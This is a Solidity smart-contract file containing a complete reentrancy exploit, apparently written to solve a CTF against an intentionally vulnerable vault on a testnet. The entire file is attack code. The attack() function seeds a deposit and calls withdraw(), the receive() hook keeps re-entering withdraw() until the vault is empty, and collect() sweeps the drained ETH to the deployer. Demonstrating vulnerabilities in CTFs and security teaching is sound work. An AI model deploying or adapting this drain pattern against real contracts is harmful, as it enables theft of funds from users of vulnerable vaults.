// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IReentrantVault {
    function deposit() external payable;
    function withdraw() external;
}

/**
 * @title  Attacker  —  canonical reentrancy exploit for ReentrantVault (CTF)
 * @notice Proves the vulnerability rather than asserting it (smart-contract-engineer rule:
 *         the exploit-or-guard must be demonstrated adversarially). A visitor deploys this,
 *         calls `attack{value: seed}`, and it re-enters the vault's `withdraw()` from
 *         `receive()` until the vault is empty — then `collect()` sweeps the loot to the
 *         deployer. Base Sepolia testnet only (BR-09/FR-024).
 */
contract Attacker {
    IReentrantVault public immutable vault;
    address public immutable owner;
    uint256 public unit; // the per-withdraw amount the loop keeps pulling

    error NotOwner();

    constructor(address _vault) {
        require(_vault != address(0), "zero vault");
        vault = IReentrantVault(_vault);
        owner = msg.sender;
    }

    /// Seed the loop with `msg.value`, deposit it, then trigger the reentrant drain.
    function attack() external payable {
        require(msg.value > 0, "seed the attack");
        unit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw(); // first withdraw; re-entrancy continues from receive()
    }

    /// The re-entrancy hook: pull another `unit` while the vault can still pay one in full.
    receive() external payable {
        if (address(vault).balance >= unit) {
            vault.withdraw();
        }
    }

    /// Sweep the drained ETH to the deployer (the CTF "capture").
    function collect() external {
        if (msg.sender != owner) revert NotOwner();
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "sweep failed");
    }
}
